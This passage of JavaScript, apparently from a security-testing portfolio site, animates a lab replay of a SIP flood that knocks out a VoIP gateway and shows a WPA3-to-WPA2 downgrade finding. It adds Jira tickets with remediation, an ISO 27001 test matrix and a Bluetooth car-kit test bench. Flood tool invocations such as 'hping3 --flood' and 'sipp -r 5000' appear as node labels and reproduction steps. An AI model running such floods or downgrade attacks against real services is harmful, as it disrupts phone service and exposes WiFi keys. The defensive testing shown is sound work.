    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">SAGEMCOM — PROTOCOL VULNERABILITY ASSESSMENT, ATTACK REPLAY</div>
      <div class="sim-p">5-year vulnerability assessment program across 10+ CPE product lines (BBox3, Vodafone, KDG, TalkTalk, Telia, Bouygues, Sunrise, KPN). This replay reconstructs a lab security test on the KDG VoIP gateway: a botnet floods the SIP service with unauthenticated REGISTER/INVITE requests while Wireshark captures the traffic — the gateway CPU saturates and legitimate VoIP calls fail. A second check exposes a WPA3/SAE downgrade misconfiguration on the WiFi interface.</div>

      <div class="sim-section active" data-sim="attack">
        <div class="kpi-strip">
          <div class="kpi-box"><div class="kpi-box-val" id="sg-pps">0</div><div class="kpi-box-lbl">SIP packets / s</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="sg-cpu">12%</div><div class="kpi-box-lbl">Gateway CPU</div></div>
          <div class="kpi-box"><div class="kpi-box-val" id="sg-reg">0</div><div class="kpi-box-lbl">REGISTER 401 / s</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert" id="sg-fail">0</div><div class="kpi-box-lbl">Legit calls failed</div></div>
        </div>

        <div class="vs-stage" id="sg-stage" style="min-height:270px">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">TEST LAB — VOIP VLAN 10 · SIP.SERVER 10.0.0.1</span>

          <div class="vs-node attacker" id="sg-b1" style="left:11%;top:16%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">BOT-1</div>
            <div class="vs-node-sub">10.9.0.11<br>hping3 --flood</div>
          </div>
          <div class="vs-node attacker" id="sg-b2" style="left:11%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">BOT-2</div>
            <div class="vs-node-sub">10.9.0.12<br>sipp -r 5000/s</div>
          </div>
          <div class="vs-node attacker" id="sg-b3" style="left:11%;top:84%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">💻</span>
            <div class="vs-node-title">BOT-3</div>
            <div class="vs-node-sub">10.9.0.13<br>sippts invite flood</div>
          </div>

          <div class="vs-node on" id="sg-gw" style="left:50%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">☎️</span>
            <div class="vs-node-title">KDG VOIP GATEWAY</div>
            <div class="vs-node-sub" id="sg-gw-sub">10.0.0.1 · Asterisk<br>CPU 12% · SIP OK</div>
          </div>

          <div class="vs-node on" id="sg-cl" style="left:87%;top:50%">
            <span class="vs-led"></span>
            <span class="vs-node-ico">📞</span>
            <div class="vs-node-title">LEGIT SUBSCRIBER</div>
            <div class="vs-node-sub" id="sg-cl-sub">10.0.0.50<br>call active ✓</div>
          </div>

          <div class="vs-phase-line" id="sg-phase">t+0s — baseline: legitimate SIP traffic only</div>
        </div>

        <div class="skill-modal-grid" style="margin-bottom:14px">
          <div>
            <div class="sim-h">WIRESHARK — sip_flood_lab4.pcap (live capture)</div>
            <div class="ws-cap">
              <div class="ws-cap-head">
                <span>NO.</span><span>TIME</span><span>SOURCE</span><span>DEST</span><span>PROTO</span><span>INFO</span>
              </div>
              <div class="ws-cap-body" id="sg-ws"></div>
            </div>
          </div>
          <div>
            <div class="sim-h">WIFI CHECK — WPA3 / SAE HANDSHAKE</div>
            <div class="ws-cap">
              <div class="ws-cap-head" style="grid-template-columns:56px 84px 1fr 64px">
                <span>NO.</span><span>TIME</span><span>INFO</span><span>RESULT</span>
              </div>
              <div style="padding:8px 10px;font-size:11px;line-height:1.9" id="sg-wpa3">
                <div>1182 · Beacon — SSID <b style="color:var(--fg)">KDG-Home-5G</b> · RSN: WPA2-PSK + WPA3-SAE <i style="color:var(--fg-dim)">(transition mode)</i></div>
                <div>1184 · SAE Commit → <span style="color:var(--neon-4)">SAE Confirm MISSING</span> — downgrade path detected</div>
                <div>1187 · <span style="color:var(--neon-3)">WPA2 4-way handshake completed instead</span> — PMK derived from PSK</div>
                <div>1191 · PSK entropy check: <span style="color:var(--neon-3)">10 chars → offline dictionary attack feasible</span></div>
                <div style="margin-top:8px;border-top:1px dashed var(--line);padding-top:8px;color:var(--neon-3)">
                  ⚠ FINDING F-02 — WPA3 transition mode without SAE enforcement: clients silently downgrade to WPA2-PSK → offline cracking. CVSS 7.4 (HIGH), 100% reproducible.
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="sim-h">FINDINGS FROM THIS TEST RUN</div>
        <ul class="vs-steps">
          <li class="vs-step fail"><span class="vs-step-ico">🐞</span><div class="vs-step-body"><b>F-01 · CRITICAL — Unauthenticated SIP flood → gateway DoS</b> — REGISTER/INVITE accepted without auth challenge; 5k req/s starves the CPU; legitimate calls fail. CVSS 7.5, 100% reproducible → Jira <span class="code-inline">KDG-2017-0453</span></div><span class="vs-step-state">FAIL</span></li>
          <li class="vs-step fail"><span class="vs-step-ico">🐞</span><div class="vs-step-body"><b>F-02 · HIGH — WPA3/SAE downgrade</b> — transition mode without enforcement lets clients fall back to WPA2-PSK with weak pre-shared key → offline dictionary attack. CVSS 7.4 → Jira <span class="code-inline">KDG-2017-0453</span></div><span class="vs-step-state">FAIL</span></li>
        </ul>
      </div>

      <div class="sim-section" data-sim="ticket">
        <div class="sim-h">JIRA — TWO SECURITY FINDINGS FROM THE KDG PRODUCT LINE</div>
        <div class="sim-p">Both tickets were filed with full evidence (pcap, logs, screenshots) and reproducible steps — reproduced on GUI and management-plane paths before the pre-release firmware gate.</div>
        <div class="jira-grid">
          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">KDG-2018-0917</span>
              <span class="jira-sev critical">CRITICAL · CVSS 8.0</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> KDG DOCSIS 3.1 gateway (production firmware)<br>
                <b>Type:</b> Functional / Availability — mass impact<br>
                <b>Reproducibility:</b> 100% — GUI &amp; SNMP both
              </div>
              <h5>Description</h5>
              Factory reset from GUI or SNMP pushes the gateway into an infinite reboot loop — the device is effectively bricked; no further management access is possible.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Login to the gateway GUI as admin (default lab credentials)</li>
                <li>Trigger <span class="code-inline">factory reset</span> from Administration → Maintenance</li>
                <li>Observe the boot: cycle 1 → cycle 2 → cycle 3 … boot loop never ends</li>
                <li>Repeat over SNMP (<span class="code-inline">snmpset … enterprises… reboot.0 i 2</span>) — same infinite loop</li>
              </ol>
              <h5>Evidence</h5>
              boot_cycle.log · serial_console.txt · 5 screenshots (GUI + CLI)
              <h5>Remediation (shipped pre-release)</h5>
              <ul class="jira-rem">
                <li>CLI boot-interrupt mechanism during the loop</li>
                <li>Manual firmware re-upgrade to same version recovers the device</li>
                <li>Fix validated by TC-117-03 regression — no recurrence</li>
                <li>Cycle closed before production — mass customer impact avoided</li>
              </ul>
            </div>
          </div>

          <div class="jira-ticket">
            <div class="jira-head">
              <span class="jira-id">KDG-2017-0453</span>
              <span class="jira-sev critical">CRIT+HIGH · CVSS 7.5</span>
            </div>
            <div class="jira-body">
              <div class="jira-meta">
                <b>Product:</b> KDG gateway — VoIP stack + WiFi interface<br>
                <b>Type:</b> Security — DoS / cryptographic downgrade<br>
                <b>Reproducibility:</b> 100% — repeated on 3 firmware builds
              </div>
              <h5>Description</h5>
              Two linked findings: (1) the SIP service accepts unauthenticated REGISTER/INVITE floods until the CPU saturates and legitimate calls fail; (2) the WiFi interface runs WPA2/WPA3 "transition mode" without SAE enforcement, silently downgrading clients to WPA2-PSK.
              <h5>Steps to Reproduce</h5>
              <ol class="jira-steps">
                <li>Connect 3 test clients (bots) to the VoIP VLAN 10 segment</li>
                <li>Launch <span class="code-inline">sipp -r 5000</span> REGISTER flood + <span class="code-inline">sippts invite</span> against 10.0.0.1</li>
                <li>Watch the gateway CPU climb to ~99% in Wireshark + device dashboard</li>
                <li>Attempt a legitimate REGISTER from 10.0.0.50 → <span class="code-inline">500 Server Internal Error</span> — call fails</li>
                <li>WiFi: associate a WPA3-SAE client to <span class="code-inline">KDG-Home-5G</span>, capture with Wireshark → 4-way WPA2 handshake instead of SAE (downgrade confirmed)</li>
              </ol>
              <h5>Evidence</h5>
              sip_flood_lab4.pcap · sae_downgrade.pcap · cpu_graph.png
              <h5>Remediation</h5>
              <ul class="jira-rem">
                <li>SIP: authentication challenge (401 + digest) before REGISTER processing</li>
                <li>SIP: per-source rate-limiting + flood detection alarm</li>
                <li>WiFi: WPA3-SAE-only mode (PMF required) — transition mode removed</li>
                <li>Regression tests TC-SIP-0453-01 / TC-WIFI-0453-02 added to the suite</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="traceability">
        <div class="sim-h">ISO 27001:2022 — TRACEABILITY CHAIN (requirement → test case → finding)</div>
        <div class="ah-flow">
          <div class="ah-step"><span class="ah-step-no">01</span>📋 Requirement</div>
          <div class="ah-step"><span class="ah-step-no">02</span>🧪 Test Case</div>
          <div class="ah-step"><span class="ah-step-no">03</span>⚙️ Execution</div>
          <div class="ah-step"><span class="ah-step-no">04</span>🐞 Finding</div>
        </div>
        <div class="ah-flow" style="margin-bottom:14px">
          <div class="ah-step"><span class="ah-step-no">05</span>🎫 Jira Ticket</div>
          <div class="ah-step"><span class="ah-step-no">06</span>🔧 Remediation</div>
          <div class="ah-step"><span class="ah-step-no">07</span>✅ Re-test</div>
          <div class="ah-step"><span class="ah-step-no">08</span>📁 Audit Evidence</div>
        </div>

        <div class="sim-h">ANNEX A MATRIX — HOW EACH TESTCASE LINKS REQUIREMENTS &amp; FINDINGS</div>
        <div style="overflow-x:auto">
          <table class="iso-table">
            <thead>
              <tr>
                <th>ISO CONTROL</th><th>REQUIREMENT</th><th>TEST CASE</th><th>TEST OBJECTIVE</th><th>RESULT</th><th>FINDING / EVIDENCE</th>
              </tr>
            </thead>
            <tbody>
              <tr class="fail">
                <td>A.8.8<br><span style="color:var(--fg-dim)">Tech. vulnerability mgmt</span></td>
                <td><span class="tcode">REQ-KDG-2018-117</span><br>"Factory reset must restore default config and reboot normally"</td>
                <td><span class="tcode">TC-117-01</span> GUI reset<br><span class="tcode">TC-117-02</span> SNMP reset<br><span class="tcode">TC-117-03</span> regression</td>
                <td>Trigger factory reset from GUI and SNMP; device must come back to operational state</td>
                <td><span class="pill fail">FAIL</span></td>
                <td><span class="tcode">KDG-2018-0917</span><br>boot_cycle.log · serial_console.txt</td>
              </tr>
              <tr class="fail">
                <td>A.8.20<br><span style="color:var(--fg-dim)">Networks security</span></td>
                <td><span class="tcode">REQ-KDG-2017-201</span><br>"SIP service must survive 5,000 req/s without service loss"</td>
                <td><span class="tcode">TC-SIP-0453-01</span> flood 60s</td>
                <td>REGISTER/INVITE flood at 5k req/s for 60s; legitimate calls must still complete</td>
                <td><span class="pill fail">FAIL</span></td>
                <td><span class="tcode">KDG-2017-0453 (F-01)</span><br>sip_flood_lab4.pcap</td>
              </tr>
              <tr class="fail">
                <td>A.8.24<br><span style="color:var(--fg-dim)">Use of cryptography</span></td>
                <td><span class="tcode">REQ-KDG-2017-208</span><br>"WPA3-SAE must be enforced on 5GHz SSID"</td>
                <td><span class="tcode">TC-WIFI-0453-02</span> SAE handshake</td>
                <td>WPA3 client must complete SAE handshake; no downgrade to WPA2-PSK allowed</td>
                <td><span class="pill fail">FAIL</span></td>
                <td><span class="tcode">KDG-2017-0453 (F-02)</span><br>sae_downgrade.pcap</td>
              </tr>
              <tr class="pass">
                <td>A.8.5<br><span style="color:var(--fg-dim)">Secure authentication</span></td>
                <td><span class="tcode">REQ-KDG-2018-119</span><br>"Default management credentials must be rejected"</td>
                <td><span class="tcode">TC-119-01</span> default creds</td>
                <td>GUI/SSH login with factory defaults must fail and lock out after 3 attempts</td>
                <td><span class="pill pass">PASS</span></td>
                <td>— no finding · auth_lock.log retained</td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="sim-p" style="margin-top:12px">Every requirement is derived from an ISO 27001:2022 Annex A control, executed through one or more test cases, and every failed test case is traceable to a Jira finding with attached evidence — the audit chain requirement→test→finding→evidence is preserved end-to-end.</div>
      </div>
    `;

    /* ---- Tab 1: attack replay animation ---- */
    const stage = $('#sg-stage', host);
    const svg = vsInitSvg(stage, 270);
    const VB = 270;
    const linkB1 = vsLink(svg, 11, 16, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkB2 = vsLink(svg, 11, 50, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkB3 = vsLink(svg, 11, 84, 50, 50, VB, { cls: 'attack', hidden: true });
    const linkCl = vsLink(svg, 87, 50, 50, 50, VB, { hidden: true });

    const phase = $('#sg-phase', host);
    const gwSub = $('#sg-gw-sub', host);
    const clSub = $('#sg-cl-sub', host);
    const gwNode = $('#sg-gw', host);
    const clNode = $('#sg-cl', host);
    const bots = ['#sg-b1', '#sg-b2', '#sg-b3'].map((s) => $(s, host));

    // wireshark stream
    const wsBody = $('#sg-ws', host);
    const wsTemplates = [
      ['err',  'SIP/2.0',  'Request: REGISTER sip:lab.kdg.voip (no Authorization header)'],
      ['err',  'SIP/2.0',  'Status: 401 Unauthorized'],
      ['err',  'SIP/2.0',  'Request: INVITE sip:100@kdg (malformed SDP — s= line missing)'],
      ['warn', 'ICMP',     'Echo (ping) request  id=0x0001, seq={SEQ}'],
      ['err',  'SIP/2.0',  'Request: REGISTER (retransmission #{RTX} — no auth)'],
      ['ok',   'ARP',      'Who has 10.0.0.1?  Tell 10.9.0.{B}'],
      ['ok',   'TLSv1.2',  'Application Data (len=512)'],
      ['err',  'SIP/2.0',  'Status: 500 Server Internal Error'],
      ['err',  'SIP/2.0',  'Request: OPTIONS * — flood keepalive'],
      ['warn', 'UDP',      'Malformed packet (declared 1400B, captured 512B)']
    ];
    let wsNo = 4187, seq = 8400, rtx = 3;
    const botIps = ['11', '12', '13'];
    function pushWs() {
      const pick = wsTemplates[Math.floor(Math.random() * wsTemplates.length)];
      const [lvl, proto, info] = pick;
      const row = el('div', `ws-row ${lvl === 'err' ? 'sip' : ''} ${lvl}`);
      const infoTxt = info.replace('{SEQ}', seq++).replace('{RTX}', rtx++).replace('{B}', botIps[Math.floor(Math.random() * 3)]);
      row.innerHTML = `
        <span class="ws-no">${wsNo++}</span>
        <span class="ws-t">0.${String(Math.floor(Math.random() * 900) + 100)}</span>
        <span>10.9.0.${botIps[Math.floor(Math.random() * 3)]}</span>
        <span>10.0.0.1</span>
        <span class="ws-pr">${proto}</span>
        <span class="ws-info">${infoTxt}</span>`;
      wsBody.appendChild(row);
      const all = $$('.ws-row', wsBody);
      if (all.length > 26) all[0].remove();
      wsBody.scrollTop = wsBody.scrollHeight;
    }
    for (let i = 0; i < 8; i++) pushWs();

    function playAttack() {
      // reset
      wsBody.innerHTML = '';
      for (let i = 0; i < 8; i++) pushWs();
      [linkB1, linkB2, linkB3].forEach((l) => { if (l) { l.off(); l.deactivate(); } });
      if (linkCl) { linkCl.deactivate(); }
      if (linkCl) linkCl.packets(3, 'var(--neon)', 1.6).on();
      gwNode.className = 'vs-node on';
      clNode.className = 'vs-node on';
      clSub.innerHTML = '10.0.0.50<br>call active ✓';
      bots.forEach((b) => { if (b) b.className = 'vs-node attacker'; });

      let cpu = 12, pps = 0, reg401 = 0, fails = 0;
      const kpi = $('#sg-pps', host), kcpu = $('#sg-cpu', host),
            kreg = $('#sg-reg', host), kfail = $('#sg-fail', host);

      // phase 0: baseline
      phase.innerHTML = 't+0s — baseline: legitimate SIP traffic only';
      gwSub.innerHTML = '10.0.0.1 · Asterisk<br>CPU 12% · SIP OK';
      if (kcpu) kcpu.textContent = '12%';

      // phase 1: attack starts
      timers.later(() => {
        phase.innerHTML = '<span class="warn">t+2s — botnet ramp-up: unauthenticated REGISTER/INVITE flood begins</span>';
        bots.forEach((b) => { if (b) b.className = 'vs-node attacker on'; });
        [linkB1, linkB2, linkB3].forEach((l) => {
          if (l) l.activate().packets(5, 'var(--neon-3)', 0.9).on();
        });
      }, 2000);

      // phase 2: CPU saturating
      timers.later(() => {
        phase.innerHTML = '<span class="err">t+7s — gateway CPU saturated — REGISTER/INVITE queue overflows</span>';
        gwNode.className = 'vs-node hit';
      }, 7000);

      // phase 3: legit calls fail
      timers.later(() => {
        phase.innerHTML = '<span class="err">t+10s — legitimate subscriber REGISTER → 500 — VoIP service DOWN</span>';
        clNode.className = 'vs-node hit';
        clSub.innerHTML = '10.0.0.50<br>REGISTER → 500 ✗';
        if (linkCl) { linkCl.off(); linkCl.packets(2, 'var(--neon-3)', 1.1).on(); }
      }, 10000);

      // phase 4: verdict
      timers.later(() => {
        phase.innerHTML = '<span class="err">FINDING F-01 — DoS: unauthenticated SIP flood · CVSS 7.5 · 100% reproducible → Jira KDG-2017-0453</span>';
      }, 13000);

      // KPI + capture ticker
      const tick = timers.every(() => {
        const ramp = Date.now();
        pushWs();
        const t = (ramp - tickStart) / 1000;
        const target = t < 2 ? 120 : Math.min(18400, 120 + (t - 2) * 3400);
        pps = Math.round(target + (Math.random() * 400 - 200));
        cpu = Math.min(99, t < 2 ? 12 : 12 + (t - 2) * 16);
        reg401 = t < 2 ? 0 : Math.round(Math.min(5100, (t - 2) * 950));
        fails = t < 10 ? 0 : Math.min(96, Math.round((t - 10) * 24));
        if (kpi) kpi.textContent = pps.toLocaleString();
        if (kcpu) kcpu.textContent = Math.round(cpu) + '%';
        if (kreg) kreg.textContent = reg401.toLocaleString();
        if (kfail) kfail.textContent = fails;
        if (t > 1.5 && t < 9.5) gwSub.innerHTML = `10.0.0.1 · Asterisk<br>CPU ${Math.round(cpu)}% · queue overflow`;
        if (t >= 9.5) gwSub.innerHTML = '10.0.0.1 · Asterisk<br>CPU 99% · SIP DOWN ✗';
      }, 700);
      const tickStart = Date.now();
      timers.later(() => clearInterval(tick), 14000);

      // loop the replay
      timers.later(() => playAttack(), 15500);
    }
    playAttack();

    // animate traceability flow on demand (runs once)
    $$('.ah-step', host).forEach((s, i) => {
      timers.later(() => s.classList.add('active'), 400 + i * 160);
      timers.later(() => { s.classList.remove('active'); s.classList.add('done'); }, 400 + i * 160 + 550);
    });

    ctx.tabs = [
      { id: 'attack',       label: '// Attack Replay — DDoS & SIP' },
      { id: 'ticket',       label: '// Jira Ticket' },
      { id: 'traceability', label: '// ISO 27001 Matrix' }
    ];
  };

  /* =================================================================
   *  5. FOCUS INTERNATIONAL — Bluetooth car-kit stress test
   * ================================================================= */
  SIMS['bluetooth-test'] = (host, ctx) => {
    const timers = makeTimers(host);
    host.innerHTML = `
      <div class="sim-h">FOCUS INTERNATIONAL — PARROT AUTOMOTIVE BLUETOOTH VALIDATION</div>
      <div class="sim-p">Manual validation of Bluetooth car-kit connectivity: incoming/outgoing calls, music streaming, contact sync, multi-phone support. Stress-tested protocol state machines: repeated connect/disconnect, multi-phone handoff, overnight persistence. Reported in Bugzilla with reproducible steps.</div>

      <div class="sim-section active" data-sim="sim">
        <div class="sim-h">BLUETOOTH SIGNAL + STATE MACHINE</div>
        <div class="bt-wave" id="bt-wave"></div>
        <div class="sim-h">ACTIVE TESTS</div>
        <ul style="list-style:none;padding:0;font-size:12px;color:var(--fg-soft);line-height:1.8">
          <li>▸ <span class="stack-chip">CK3100</span> + iPhone 3GS — pairing</li>
          <li>▸ <span class="stack-chip">Porsche Carkit</span> + Nokia N73 — incoming call</li>
          <li>▸ Multi-phone handoff: iPhone ↔ Blackberry ↔ Nokia</li>
          <li>▸ Overnight persistence: 12h connected, re-test on wake</li>
        </ul>
        <div class="sim-h" style="margin-top:14px">STATE MACHINE — 1000 CYCLES</div>
        <div class="siem-kpis" style="grid-template-columns:repeat(4,1fr)">
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-cycles">0</div><div class="siem-kpi-lbl">CONNECT/DISCONNECT CYCLES</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-paired">3</div><div class="siem-kpi-lbl">PAIRED PHONES</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-calls">0</div><div class="siem-kpi-lbl">CALLS TESTED</div></div>
          <div class="siem-kpi"><div class="siem-kpi-val" id="bt-bugs">0</div><div class="siem-kpi-lbl">BUGS FOUND</div></div>
        </div>
      </div>

      <div class="sim-section" data-sim="bug">
        <div class="sim-h">BUGZILLA BUG REPORT — TEMPLATE</div>
        <pre class="code-viewer"><span class="k">Product</span>:      <span class="s">Parrot CK3100 — firmware v1.06b</span>
<span class="k">Component</span>:    <span class="s">Bluetooth stack — state machine</span>
<span class="k">Severity</span>:     <span class="s">major</span>
<span class="k">Title</span>:        <span class="s">Multi-phone handoff loses call when 3rd phone pairs</span>

<span class="k">Steps to Reproduce</span>:
  1. Pair iPhone 3GS — establish call
  2. Pair Nokia N73 — establish call (iPhone put on hold)
  3. Pair Blackberry 9700 — observe state of iPhone/Nokia calls

<span class="k">Expected</span>:     <span class="s">3rd phone pairs, calls queue correctly</span>
<span class="k">Actual</span>:       <span class="s">3rd pairing drops BOTH active calls without notice</span>

<span class="k">Logs</span>:         <span class="s">bt_hci_log_2012-08-14.txt attached</span>
<span class="k">Environment</span>: <span class="s">CK3100 + 3 phones (BT v2.0 + EDR), 12V car adapter</span>
<span class="k">Reported</span>:    <span class="s">directly to Parrot (France) — daily report cycle</span></pre>
      </div>

      <div class="sim-section" data-sim="carkit">
        <div class="sim-h">LIVE TEST BENCH — PORSCHE CARKIT + MULTI-PHONE</div>
        <div class="sim-p">Replay of a real bench session: phones paired to the production Porsche head-unit over HFP (call control), PBAP (contacts) and A2DP (audio). Watch the head-unit HMI, the Bluetooth links and the per-phone states while test plan TC-BT-2013-088 executes — ending with a security check: an unauthorised pairing attempt that must be rejected.</div>

        <div class="btb-stage" id="btb-stage">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">BT TEST BENCH — CLASS 2 · 10m · HFP/PBAP/A2DP</span>

          <div class="btb-phone" id="btb-p1" style="left:13%;top:18%">
            <div class="btb-phone-ico">📱</div>
            <div class="btb-phone-name">iPhone 3GS</div>
            <div class="btb-phone-sub">HFP · PBAP · A2DP</div>
            <div class="btb-state" id="btb-s1">IDLE</div>
          </div>
          <div class="btb-phone" id="btb-p2" style="left:13%;top:80%">
            <div class="btb-phone-ico">📱</div>
            <div class="btb-phone-name">Nokia N73</div>
            <div class="btb-phone-sub">HFP · PBAP</div>
            <div class="btb-state" id="btb-s2">IDLE</div>
          </div>
          <div class="btb-phone" id="btb-p3" style="left:87%;top:18%">
            <div class="btb-phone-ico">📱</div>
            <div class="btb-phone-name">Blackberry 9700</div>
            <div class="btb-phone-sub">HFP · A2DP</div>
            <div class="btb-state" id="btb-s3">IDLE</div>
          </div>
          <div class="btb-phone" id="btb-p4" style="left:87%;top:80%">
            <div class="btb-phone-ico">📵</div>
            <div class="btb-phone-name">Unknown device</div>
            <div class="btb-phone-sub">00:11:22:33:44:55 · no PIN</div>
            <div class="btb-state" id="btb-s4">NOT PAIRED</div>
          </div>

          <div class="btb-hmi">
            <div class="btb-hmi-brand">PORSCHE</div>
            <div class="btb-hmi-screen" id="btb-screen">STANDBY</div>
          </div>
        </div>

        <div class="sim-h">TEST PLAN TC-BT-2013-088 — LIVE EXECUTION</div>
        <ul class="vs-steps" id="btb-steps">
          <li class="vs-step pending"><span class="vs-step-ico">🔗</span><div class="vs-step-body"><b>Pair iPhone 3GS</b> — secure simple pairing, PIN exchange, link-key stored in carkit NV memory</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📇</span><div class="vs-step-body"><b>Phonebook sync (PBAP)</b> — all 248 contacts pulled to the head-unit, special characters verified on HMI display</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📞</span><div class="vs-step-body"><b>Pair Nokia N73 + incoming call</b> — ring tone on car speakers, answered from steering-wheel button, audio routed, mic active</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">📤</span><div class="vs-step-body"><b>Outgoing call — voice dial via iPhone</b> — HFP AT+BLDN, Nokia call auto-held, audio source switch &lt; 1s</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">➕</span><div class="vs-step-body"><b>Multi-point test</b> — Blackberry paired while a call is queued: 3 phones connected simultaneously, active-audio arbitration correct</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🛡️</span><div class="vs-step-body"><b>Security check — unauthorised pairing</b> — rogue device attempts pairing with no PIN: must be REJECTED and carkit must leave discoverable mode</div><span class="vs-step-state">QUEUED</span></li>
          <li class="vs-step pending"><span class="vs-step-ico">🔁</span><div class="vs-step-body"><b>Stress — 1000 connect/disconnect cycles</b> — no state-machine deadlock, no lost pairing, active calls survive re-connect</div><span class="vs-step-state">QUEUED</span></li>
        </ul>
      </div>
    `;

    // bluetooth wave animation
    const wave = $('#bt-wave', host);
    const bars = [];
    for (let i = 0; i < 60; i++) {
      const b = el('div', 'bt-wave-bar');
      b.style.left = `${(i / 60) * 100}%`;
      wave.appendChild(b);
      bars.push(b);
    }
    let cycles = 0, calls = 0, bugs = 0;
    timers.every(() => {
      bars.forEach((b, i) => {
        const h = Math.abs(Math.sin((Date.now() / 200) + i * 0.3)) * 70 + 5;
        b.style.height = h + 'px';
      });
    }, 60);

    // counter interval
    timers.every(() => {
      cycles += Math.floor(Math.random() * 7) + 1;
      if (Math.random() > 0.7) calls += 1;
      if (Math.random() > 0.95) bugs += 1;
      const c1 = $('#bt-cycles', host); if (c1) c1.textContent = cycles;
      const c2 = $('#bt-calls', host);  if (c2) c2.textContent = calls;
      const c3 = $('#bt-bugs', host);   if (c3) c3.textContent = bugs;
    }, 600);

    /* ---- 3rd tab: Porsche carkit live bench ---- */
    const stage = $('#btb-stage', host);
    const svg = vsInitSvg(stage, 260);
    const VB = 260;
    // links from each phone to the HMI (packets hidden until phase runs)
    const l1 = vsLink(svg, 13, 18, 50, 50, VB, { hidden: true }); // iPhone
    const l2 = vsLink(svg, 13, 80, 50, 50, VB, { hidden: true }); // Nokia
    const l3 = vsLink(svg, 87, 18, 50, 50, VB, { hidden: true }); // Blackberry
    const l4 = vsLink(svg, 87, 80, 50, 50, VB, { hidden: true }); // rogue

    const screen = $('#btb-screen', host);
    const hmi = (html, alert) => {
      screen.className = 'btb-hmi-screen' + (alert ? ' alert' : '');
      screen.innerHTML = html;
    };
    const phone = (id, stateId, cls, stateTxt) => {
      const p = $(id, host); const s = $(stateId, host);
      if (p) p.className = 'btb-phone ' + cls;
      if (s) s.textContent = stateTxt;
    };
    const resetBench = () => {
      phone('#btb-p1', '#btb-s1', '', 'IDLE');
      phone('#btb-p2', '#btb-s2', '', 'IDLE');
      phone('#btb-p3', '#btb-s3', '', 'IDLE');
      phone('#btb-p4', '#btb-s4', '', 'NOT PAIRED');
      [l1, l2, l3, l4].forEach((l) => { if (l) { l.off(); l.deactivate(); } });
      hmi('STANDBY');
    };

    function playBench() {
      resetBench();
      const phases = [
        { // 1. pair iPhone
          dur: 2600,
          run() {
            hmi('PAIRING…<br><span class="big">iPhone 3GS</span>');
            if (l1) { l1.activate(); }
          },
          end() {
            phone('#btb-p1', '#btb-s1', 'linked', 'CONNECTED');
            if (l1) l1.packets(3, 'var(--neon)', 1.1).on();
            hmi('PAIRED<br><span class="big">iPhone 3GS</span><br>1 DEVICE');
          }
        },
        { // 2. PBAP contact sync
          dur: 3200,
          run() {
            hmi('PHONEBOOK SYNC<br><span class="big">0 / 248</span>');
            if (l1) { l1.off(); l1.packets(6, 'var(--neon-2)', 0.7).on(); }
            let n = 0;
            const cnt = timers.every(() => {
              n = Math.min(248, n + 9);
              hmi(`PHONEBOOK SYNC<br><span class="big">${n} / 248</span>`);
              if (n >= 248) clearInterval(cnt);
            }, 90);
            timers.later(() => clearInterval(cnt), 3200);
          },
          end() {
            if (l1) { l1.off(); l1.packets(2, 'var(--neon)', 1.4).on(); }
            hmi('PHONEBOOK<br><span class="big">248 CONTACTS ✓</span>');
          }
        },
        { // 3. pair Nokia + incoming call
          dur: 3400,
          run() {
            phone('#btb-p2', '#btb-s2', 'ringing', 'INCOMING CALL');
            if (l2) { l2.activate(); l2.packets(4, 'var(--neon-4)', 0.9).on(); }
            hmi('PAIRING…<br><span class="big">Nokia N73</span><br>then INCOMING CALL…');
            timers.later(() => {
              phone('#btb-p2', '#btb-s2', 'linked', 'RINGING → ANSWERED');
              hmi('INCOMING CALL<br><span class="big">Nokia N73</span><br>📞 ANSWERED — MIC ON');
            }, 1500);
          },
          end() {
            phone('#btb-p2', '#btb-s2', 'linked', 'CALL ACTIVE');
            if (l2) { l2.off(); l2.packets(2, 'var(--neon)', 1.3).on(); }
            hmi('CALL 00:07<br><span class="big">Nokia N73</span><br>audio → car speakers');
          }
        },
        { // 4. outgoing call via iPhone (Nokia held)
          dur: 3200,
          run() {
            phone('#btb-p2', '#btb-s2', 'linked hold', 'ON HOLD');
            phone('#btb-p1', '#btb-s1', 'linked', 'DIALING…');
            if (l1) { l1.off(); l1.packets(5, 'var(--neon-4)', 0.8).on(); }
            hmi('VOICE DIAL<br><span class="big">+216 98 123 456</span><br>AT+BLDN → dialing…');
            timers.later(() => {
              hmi('CALL 00:04<br><span class="big">+216 98 123 456</span><br>Nokia call auto-held');
            }, 1400);
          },
          end() {
            phone('#btb-p1', '#btb-s1', 'linked', 'CALL ACTIVE');
            if (l1) { l1.off(); l1.packets(2, 'var(--neon)', 1.3).on(); }
            hmi('2 CALLS<br><span class="big">1 ACTIVE · 1 HELD</span>');
          }
        },
        { // 5. multi-point: Blackberry joins
          dur: 3000,
          run() {
            phone('#btb-p3', '#btb-s3', 'linked', 'CONNECTING');
            if (l3) { l3.activate(); l3.packets(3, 'var(--neon)', 1.0).on(); }
